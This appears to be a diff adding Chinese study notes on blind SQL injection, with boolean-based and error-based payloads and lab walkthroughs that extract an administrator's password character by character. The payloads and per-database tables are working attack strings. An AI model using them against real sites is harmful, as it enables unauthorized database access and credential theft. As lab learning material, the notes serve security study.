@@ -258,7 +258,188 @@ SQL盲注是指应用程序容易受到SQL注入的攻击，但HTTP响应不包�
 
 #### 通过触发条件响应使用SQL盲注
 
+当网站应用程序交互使用Cookie时，
 
+```
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+```
+
+当处理包含Cookie的请求时，应用程序会使用SQL语句查询是否存在用户
+
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+
+此时可能存在SQL注入，查询的结果不会返回给用户，但网站的响应可能存在不同。
+
+可以使用类似注入语句
+
+```sql
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+```
+
+假设存在一个username和password的username表，可以构造为
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+
+这时注入条件是True，将返回正确内容。
+
+语句内容为从Users表中Password字段中选取Username为Administrator对应内容的第一个字符与m的ASCII码做对比。
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+
+可以使用==SUBSTRING==猜解每一位的密码，如下
+
+| Oracle     | `SUBSTR('foobar', 4, 2)`    |
+| :--------- | --------------------------- |
+| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
+| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
+| MySQL      | `SUBSTRING('foobar', 4, 2)` |
+
+##### 例子1
+
+https://ac8c1f671fff8a06c0f30b8600d50046.web-security-academy.net/filter?category=Gifts开启代理后抓包
+
+![image-20220115113423526](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115113423526.png)
+
+发送到Repeater利用cookie作为关键字构造
+
+```sql
+'and '1'='1
+```
+
+![image-20220115113608605](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115113608605.png)
+
+正常显示Welcome Back
+
+```sql
+'and '1'='2
+```
+
+![image-20220115113733602](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115113733602.png)
+
+不能正常回显，判断此处存在注入漏洞。
+
+构造函数确定存在Users表
+
+```sql
+'AND (SELECT 'a' FROM Users LIMIT 1)='a
+```
+
+![image-20220115114301096](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115114301096.png)
+
+```sql
+'AND (SELECT 'a' FROM Users WHERE Username='administrator')='a
+```
+
+![image-20220115114533652](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115114533652.png)
+
+下一步猜解密码长度,使用Intruder自动化测试
+
+Payload类型设置为Number，从1起始至25猜解
+
+![image-20220115115000603](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115115000603.png)
+
+```sql
+'AND (SELECT 'a' FROM Users WHERE Username='administrator' AND LENGTH(Password)=1)='a
+```
+
+![image-20220115114848641](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115114848641.png)
+
+密码长度为20
+
+继续猜解每一位密码
+
+![image-20220115115743501](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115115743501.png)
+
+```sql
+'AND (SELECT SUBSTRING (Password,1,1) FROM Users WHERE Username='administrator')='a
+```
+
+![image-20220115115512942](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115115512942.png)
+
+依次猜解结果为：pt51g0yboco1bg8utmzm
+
+![image-20220115120641861](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115120641861.png)
+
+#### 通过触发SQL错误引发响应
+
+当网站执行构造的SQL语句时，并未返回不同的网站响应。可以通过有条件的出发SQL错误来诱导返回条件响应。 
+
+通常会对SQL查询语句进行修改，以便条件为真时导致数据库错误，一般是Error Message。
+
+假设发送了两个请求
+
+```sql
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+
+第一个语句因为判断1=2时为False所以跳转至ELSE
+
+第二个语句1=1判断为True则发生了1/0的除零错误，用此差异判断注入语句条件。
+
+如：
+
+```sql
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+##### 条件错误
+
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
+| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+
+##### 例子2
+
+得知数据库是Oracle，当语句为
+
+```sql
+' AND (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a
+```
+
+显示错误
+
+![image-20220115124615557](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115124615557.png)
+
+当语句为
+
+```sql
+' AND (SELECT CASE WHEN(1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a
+```
+
+正常显示，故存在SQL注入漏洞
+
+![image-20220115124720986](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115124720986.png)
+
+同样的使用Intruder猜解
+
+![image-20220115125844632](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115125844632.png)
+
+密码长度为20
+
+![image-20220115130716332](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115130716332.png)
+
+密码为：1p5msfyngan9bgvrb6gw
+
+![image-20220115132409662](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115132409662.png)
+
+## SQL注入检测方法
+
+- 基于报错的检查方法
+  使用各种符号及组合，如单引号'，双引号"，括号(和百分号%
+- 基于布尔的检测
+  最常用的' and '1'='1和' and '1'='2等同于' and '1'和'and '0'，判断寻找网站应用程序响应（返回结果）的不同
+
+## 二阶注入
 
 
 
